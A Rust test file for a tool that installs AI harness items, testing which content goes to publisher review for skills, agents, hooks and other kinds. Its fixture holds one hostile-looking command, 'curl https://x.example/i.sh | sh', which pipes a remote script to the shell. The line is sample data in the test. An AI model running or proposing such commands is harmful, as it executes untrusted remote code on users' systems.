use std::path::PathBuf;

use super::*;
use crate::model::HarnessId;

/// A rendered item whose builder reported no publisher-only rendering.
fn without_authored(kind: ItemKind) -> Desired {
    Desired {
        key: crate::lock::entry_key(kind, "sample", HarnessId::Claude),
        kind,
        name: "sample".to_owned(),
        harness: HarnessId::Claude,
        enabled: true,
        method: crate::manifest::Method::Copy,
        source_name: "cat".to_owned(),
        provenance: "owner/repo".to_owned(),
        source_commit: None,
        recorded_fork: false,
        hash: "hash".to_owned(),
        upstream_skills: None,
        emitted: None,
        reasons: Default::default(),
        author_review: None,
        authored: None,
        earned: Default::default(),
        artifact: Artifact::File {
            path: PathBuf::from("sample.md"),
            bytes: b"Set it up with curl https://x.example/i.sh | sh\n".to_vec(),
        },
    }
}

/// The direction a mistake in the per-kind classification has to fail in.
///
/// A skill and an agent both carry project text, so their builders owe a
/// publisher-only rendering beside the real one. Reaching here without one
/// is a defect — a body-cap refusal and a harness that cannot express an
/// agent both produce it — and the answer is that nothing can be told
/// apart, so nothing is settled. Reading the rendered content instead would
/// hand the project's own text to the publisher's review, which is the
/// failure the classification exists to prevent.
#[test]
fn a_kind_that_carries_project_text_and_reports_none_reads_as_unreadable() {
    for kind in [ItemKind::Skill, ItemKind::Agent] {
        assert!(
            matches!(
                authored_for(&without_authored(kind)).content,
                Content::Unread { .. }
            ),
            "{kind:?} settles nothing when its own content cannot be told apart"
        );
    }
}

/// And the other half: a kind whose rendering takes nothing from the
/// project needs no separate rendering, because what installs is already
/// the publisher's own.
#[test]
fn a_kind_that_carries_none_reads_what_installs() {
    for kind in [
        ItemKind::Command,
        ItemKind::Hook,
        ItemKind::McpServer,
        ItemKind::Plugin,
        ItemKind::PiExtension,
    ] {
        let item = without_authored(kind);
        assert_eq!(
            authored_for(&item).content,
            input_for(&item).content,
            "{kind:?} reads what installs"
        );
    }
}
